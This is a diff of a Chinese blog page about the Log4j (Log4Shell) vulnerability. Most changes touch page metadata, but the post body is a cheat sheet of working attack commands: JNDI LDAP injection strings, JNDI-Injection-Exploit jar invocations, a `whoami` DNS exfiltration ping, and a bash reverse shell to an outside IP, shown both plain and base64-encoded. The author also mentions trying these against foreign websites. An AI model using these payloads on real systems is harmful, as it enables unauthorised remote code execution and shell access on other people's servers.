@@ -42,7 +42,7 @@
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-12-10T09:21:32.000Z">
-<meta property="article:modified_time" content="2022-01-12T08:25:29.657Z">
+<meta property="article:modified_time" content="2022-01-12T08:25:30.000Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="log4j">
 <meta name="twitter:card" content="summary">
@@ -253,7 +253,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-12 16:25:29" itemprop="dateModified" datetime="2022-01-12T16:25:29+08:00">2022-01-12</time>
+                <time title="修改时间：2022-01-12 16:25:30" itemprop="dateModified" datetime="2022-01-12T16:25:30+08:00">2022-01-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -278,7 +278,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
+              <span>1.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -299,7 +299,7 @@
 
       
         <p>程序在使用日志读取用户输入时，攻击者可以构造恶意代码${}</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;f03b65e6.dns.1433.eu.org.&#x2F;exp&#125;</span><br><span class="line"></span><br><span class="line">1.7</span><br><span class="line"></span><br><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;IP:1389&#x2F;shzltp&#125;</span><br><span class="line">ldap:&#x2F;&#x2F;IP:1389&#x2F;shzltp</span><br><span class="line"></span><br><span class="line">1.8</span><br><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;IP:1389&#x2F;ojzxns&#125;</span><br><span class="line">ldap:&#x2F;&#x2F;IP:1389&#x2F;ojzxns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash转码&quot; -A  IP</span><br><span class="line"></span><br><span class="line">ping &#96;whoami&#96;.48f3ebc4.dns.1433.eu.org.</span><br><span class="line">bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A  IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;3344 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A  IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://f03b65e6.dns.1433.eu.org./exp&#125;</span><br><span class="line"></span><br><span class="line">1.7</span><br><span class="line"></span><br><span class="line">$&#123;jndi:ldap://IP:1389/shzltp&#125;</span><br><span class="line">ldap://IP:1389/shzltp</span><br><span class="line"></span><br><span class="line">1.8</span><br><span class="line">$&#123;jndi:ldap://IP:1389/ojzxns&#125;</span><br><span class="line">ldap://IP:1389/ojzxns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash转码&quot; -A  IP</span><br><span class="line"></span><br><span class="line">ping `whoami`.48f3ebc4.dns.1433.eu.org.</span><br><span class="line">bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A  IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/3344 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A  IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>感觉对于一些小型企业基本不会去使用这个东西，对于大型站点可能会去使用，但是往往他们的防护也及时，今天下午试了一些国外站点，基本上都不出网没法成功利用。。。</p>
 
@@ -446,7 +446,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">177</span>
+          <span class="site-state-item-count">176</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -459,7 +459,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-count">51</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -503,12 +503,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">1m</span>
+    <span title="站点总字数">984k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">15:11</span>
+    <span title="站点阅读时长">14:55</span>
 </div>
 
 <!--
@@ -519,7 +519,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共221.6k字</span>
+  <span class="post-count">博客全站共218.1k字</span>
 </div>
 -->
         
